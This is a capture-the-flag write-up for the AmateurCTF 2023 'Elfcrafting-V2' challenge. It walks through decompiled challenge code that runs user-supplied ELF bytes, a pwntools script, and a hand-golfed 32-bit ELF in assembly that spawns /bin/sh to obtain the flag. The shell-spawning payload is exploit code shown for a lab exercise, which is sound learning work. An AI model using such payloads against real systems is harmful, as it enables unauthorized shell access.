---
title: AmateurCTF '23 - Pwn - Elfcrafting-V2
date: '2023-07-18'
tags: ['ctf', 'pwn', 'amateurctf', 'amateurctf23', 'writeup', 'elf', 'elfcrafting-v2', 'memfd_create', 'fexecve', 'shellcode', 'asm']
draft: false
summary: Crafting a custom ELF binary in assembly to execute /bin/sh and inject that inside the file descriptor using memfd_create and fexecve.
---

## Challenge Description

The smallest possible 64 bit ELF is 80 bytes. Can you golf it down to 79 bytes?

Author: unvariant

Connection info: `nc amt.rs 31179`

## Solution

We were provided with a binary and a libc file. Let's first analyze the binary using `checksec` and `file`:

![chal](/static/writeups/amateurctf2023/pwn/ec2-0.png)

Now, let's analyze this binary in ghidra and find all the functions

![chal](/static/writeups/amateurctf2023/pwn/ec1-1.png)

Similar to the previous binary, we have the same function. Let's analyze this main

```c:main
int main(int param_1,char **param_2,char **param_3) {
  int iVar1;
  int iVar2;
  ulong uVar3;
  long in_FS_OFFSET;
  undefined4 elf;
  undefined buffer [88];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("I\'m sure you all enjoy doing shellcode golf problems.");
  puts("But have you ever tried ELF golfing?");
  puts("Have fun!");
  elf = 0x464c457f;
  iVar1 = memfd_create("golf",0);
  if (iVar1 < 0) {
    perror("failed to execute fd = memfd_create(\"golf\", 0)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar3 = read(0,buffer,79);
  if ((int)uVar3 < 0) {
    perror("failed to execute ok = read(0, buffer, 79)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("read %d bytes from stdin\n",uVar3 & 0xffffffff);
  iVar2 = memcmp(&elf,buffer,4);
  if (iVar2 != 0) {
    puts("not an ELF file :/");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar3 = write(iVar1,buffer,(long)(int)uVar3);
  if ((int)uVar3 < 0) {
    perror("failed to execute ok = write(fd, buffer, ok)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("wrote %d bytes to file\n",uVar3 & 0xffffffff);
  iVar1 = fexecve(iVar1,param_2,param_3);
  if (iVar1 < 0) {
    perror("failed to execute fexecve(fd, argv, envp)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Well, similar to the [previous](/writeups/amateurctf2023/pwn/elf-crafting-v1) challenge, we can see that the binary is reading 79 bytes from stdin and then writing it to a file descriptor. After that, it's executing the file descriptor using `fexecve`. But, the only new thing is that the code is checking that the first `4 bytes` must be `0x464c457f` which is the magic number for ELF binaries. So, we can't just send a shellcode and execute it. We have to send a valid ELF binary. Let's try to craft a valid ELF binary using assembly.

I did study about `binary-golfing` once. I'll add few [references](#references) at the end of this writeup. So, one of the most valuable resource is [MuppetLabs](https://www.muppetlabs.com/~breadbox/software/tiny/) which has a lot of tiny binaries. I'll be using the `hello world` binary from there. The asm is:

```asm
BITS 32

		org	0x05430000

		db	0x7F, "ELF"
		dd	1
		dd	0
		dd	$$
		dw	2
		dw	3
		dd	_start
		dw	_start - $$
_start:		inc	ebx			; 1 = stdout file descriptor
		add	eax, strict dword 4	; 4 = write system call number
		mov	ecx, msg		; Point ecx at string
		mov	dl, 13			; Set edx to string length
		int	0x80			; eax = write(ebx, ecx, edx)
		and	eax, 0x10020		; al = 0 if no error occurred
		xchg	eax, ebx		; 1 = exit system call number
		int	0x80			; exit(ebx)
msg:		db	'hello, world', 10
```

We'll be compiling this binary using `nasm`

```bash
nasm -f bin -o hello hello.asm && chmod +x hello
```

But, there is a check, that the final binary *must be less than "79 bytes"*. Fortunately, this one was. Now, let's write a simple python pwntools script that will send this binary to the program/server

```python
from pwn import *

io = process('./chal')
io.recv()
with open('./hello', 'rb') as f:
	buf = f.read()
io.sendline(buf)
io.interactive()
```

![chal](/static/writeups/amateurctf2023/pwn/ec2-1.png)

Well, this worked. It printed out `hello world`. Now, all we need to do, is write an assembly code, that will either give us a shell, or a simple `cat flag.txt`. So, I fumbled around, tried different codes online, even the `echo` from [MuppetLabs](https://www.muppetlabs.com/~breadbox/software/tiny), but it didn't work. Then, one of my [teammates](https://mikivirus0.github.io/), with the help of some online resources, crafted the following assembly code that spawns `/bin/sh`

```asm
 BITS 32
      org     0x00010000
      db      0x7F, "ELF"         
      dd      1                                    
      dd      0                                      
      dd      $$                           
      dw      2               
      dw      3                  
      dd      _start                 
      dd      _start                  
      dd      4                      
  _cont:
      mov     dl, 0xff         
      int     0x80  
      mov     ebx, eax
      mov     al, 3                  
      jmp _end                 
      dw      0x20                    
      dw      1                       
  _start:
      mov     al, 11                
      mov     ebx, string_start              
      int 0x80               
  _end:
    mov ecx, esp
    int 0x80
    xor ebx,ebx
    mov al, 4
    int 0x80
  string_start:
      db "/bin/sh"
  string_len equ $ - string_start
  filesize      equ     $ - $$
```

Compiling this binary, running it, and checking it's size

![chal](/static/writeups/amateurctf2023/pwn/ec2-2.png)

Well, the size is less than 79 bytes. So, running this against the remote server

![chal](/static/writeups/amateurctf2023/pwn/ec2-3.png)

Flag: `amateursCTF{d1d_i_f0rg3t_t0_p4tch_32b1t_b1naries_t00!!!}`

This challenge was pretty good and took me and my team quite a long time to solve than it actually should have. But, hey, we learned a lot of new things. So, that's a win-win situation.

## References

[Golf-Club](https://github.com/netspooky/golfclub/tree/master)

[Binary-Golfing](https://0xninja.fr/binary-golf/)

[MuppetLabs](https://www.muppetlabs.com/~breadbox/software/tiny)

[Analyzing-ELF-Binaries](https://binaryresearch.github.io/2019/09/17/Analyzing-ELF-Binaries-with-Malformed-Headers-Part-1-Emulating-Tiny-Programs.html)

[ELF-Binary-Mangaling](https://netspooky.medium.com/elf-binary-mangling-pt-2-golfin-7e5c82bb482c)
